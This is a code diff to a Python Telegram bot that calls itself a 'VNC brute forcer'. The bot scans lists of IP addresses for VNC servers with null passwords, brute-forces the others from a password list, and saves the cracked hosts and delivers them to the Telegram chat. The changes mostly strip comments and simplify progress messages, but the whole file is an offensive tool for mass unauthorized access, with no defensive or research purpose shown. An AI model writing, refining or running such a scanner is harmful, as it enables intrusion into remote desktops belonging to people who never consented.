@@ -198,7 +198,6 @@ class VNCScanner:
                     self.results.append(result)
                     self.cracked_ips.add(f"{ip}:{port}")
                 
-                # Save to file immediately
                 self.save_hit_to_file(result)
                 
                 if self.loop:
@@ -234,7 +233,6 @@ class VNCScanner:
                 self.brute_queue.task_done()
                 break
             
-            # Skip if already cracked in phase 1
             with self.lock:
                 if ip_port_key in self.cracked_ips:
                     self.checked_servers += 1
@@ -253,7 +251,6 @@ class VNCScanner:
                     with self.lock:
                         self.results.append(result)
                     
-                    # Save to file immediately
                     self.save_hit_to_file(result)
                     
                     if self.loop:
@@ -296,37 +293,27 @@ class VNCScanner:
             print(f"Error sending hit: {e}")
             
     async def update_progress(self):
-        while self.running and self.checked_servers < self.total_servers:
+        while self.running:
             await asyncio.sleep(3)
             if not self.running:
                 break
             with self.lock:
-                current = self.checked_servers
-                total = self.total_servers
                 hits = len(self.results)
                 current_pwd = self.current_password
                 active = self.active_threads
                 phase = self.phase
             elapsed = time.time() - self.start_time
-            percent = (current / total) * 100 if total > 0 else 0
-            speed = current / elapsed if elapsed > 0 else 0
-            remaining = (total - current) / speed if speed > 0 else 0
             
-            if phase == "NULL_SCAN":
-                trying_text = f'Phase 1: Checking null passwords'
+            if current_pwd:
+                trying_text = f'Trying "{current_pwd}"'
             else:
-                if current_pwd:
-                    trying_text = f'Phase 2: Trying "{current_pwd}"'
-                else:
-                    trying_text = f'Phase 2: Brute forcing'
+                trying_text = f'Checking null passwords'
             
             text = (
                 f"<b>VNC SCANNER STATUS</b>\n"
-                f"<b>Progress:</b> {current}/{total} ({percent:.1f}%)\n"
                 f"<b>Hits Found:</b> {hits}\n"
                 f"<b>Elapsed:</b> {format_time(elapsed)}\n"
-                f"<b>Remaining:</b> {format_time(remaining)}\n"
-                f"<b>Active Threads:</b> {active}/{self.scan_threads}\n"
+                f"<b>Active Threads:</b> {active}\n"
                 f"<b>Timeout:</b> {self.scan_timeout}s\n"
                 f"{trying_text}"
             )
@@ -352,20 +339,18 @@ class VNCScanner:
         self.total_servers = len(ips)
         self.start_time = time.time()
         
-        # Clear results file
         if os.path.exists(self.results_file):
             os.remove(self.results_file)
         
         print(f"Starting two-phase scan with {len(ips)} servers and {len(self.passwords)} passwords")
         
         text = (
-            f"<b>SCAN STARTED (TWO-PHASE MODE)</b>\n\n"
+            f"<b>SCAN STARTED</b>\n\n"
             f"<b>Total Servers:</b> {self.total_servers}\n"
             f"<b>Passwords:</b> {len(self.passwords)}\n"
             f"<b>Threads:</b> {self.scan_threads}\n"
             f"<b>Timeout:</b> {self.scan_timeout}s\n\n"
-            f"Phase 1: Null password scan (auto-save)\n"
-            f"Phase 2: Password brute force (skip saved)"
+            f"Initializing..."
         )
         keyboard = [[InlineKeyboardButton("STOP SCAN", callback_data=f"stop_{self.chat_id}")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -403,17 +388,16 @@ class VNCScanner:
                 pass
         
         for t in threads:
-            t.join(timeout=1)
+            t.join(timeout=2)
         
         print(f"Phase 1 complete: {len(self.cracked_ips)} null hits, {len(self.null_servers)} need brute force")
         
-        # PHASE 2: BRUTE FORCE (skip already cracked)
-        if self.running and len(self.null_servers) > 0:
+        # PHASE 2: BRUTE FORCE
+        if self.running and len(self.null_servers) > 0 and len(self.passwords) > 0:
             self.phase = "BRUTE_FORCE"
             self.checked_servers = 0
-            self.total_servers = len(self.null_servers)
             
-            print(f"Phase 2: Brute forcing {len(self.null_servers)} servers (skipping {len(self.cracked_ips)} already cracked)")
+            print(f"Phase 2: Brute forcing {len(self.null_servers)} servers")
             
             threads = []
             for _ in range(self.scan_threads):
@@ -437,12 +421,13 @@ class VNCScanner:
                     pass
             
             for t in threads:
-                t.join(timeout=1)
+                t.join(timeout=2)
         
         self.running = False
         
         try:
-            await asyncio.wait_for(update_task, timeout=2)
+            update_task.cancel()
+            await asyncio.sleep(0.1)
         except:
             pass
         
@@ -462,7 +447,7 @@ class VNCScanner:
                 f"<b>SCAN COMPLETED</b>\n\n"
                 f"<b>Hits Found:</b> {len(self.results)}\n"
                 f"<b>Time Elapsed:</b> {format_time(elapsed)}\n\n"
-                f"Results auto-saved during scan"
+                f"Results auto-saved"
             )
         
         try:
@@ -475,7 +460,6 @@ class VNCScanner:
         except:
             pass
             
-        # Send final results file
         if len(self.results) > 0 and os.path.exists(self.results_file):
             try:
                 with open(self.results_file, 'rb') as f:
@@ -508,7 +492,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     reply_markup = InlineKeyboardMarkup(keyboard)
     text = (
-        "<b>VNC BRUTE FORCER BOT (AUTO-SAVE)</b>\n\n"
+        "<b>VNC BRUTE FORCER BOT</b>\n\n"
         "Select an option to continue"
     )
     await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
@@ -553,7 +537,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "<b>SETTINGS</b>\n\nClick to change values\n\nNote: Auto-saves hits, skips cracked IPs in phase 2",
+            "<b>SETTINGS</b>\n\nClick to change values",
             reply_markup=reply_markup,
             parse_mode=ParseMode.HTML
         )
@@ -604,7 +588,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "<b>VNC BRUTE FORCER BOT (AUTO-SAVE)</b>\n\nSelect an option",
+            "<b>VNC BRUTE FORCER BOT</b>\n\nSelect an option",
             reply_markup=reply_markup,
             parse_mode=ParseMode.HTML
         )
@@ -721,7 +705,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     application.add_handler(MessageHandler(filters.ALL, handle_message))
     
-    print("Bot started - Two-Phase Auto-Save VNC Scanner")
+    print("Bot started - VNC Scanner")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
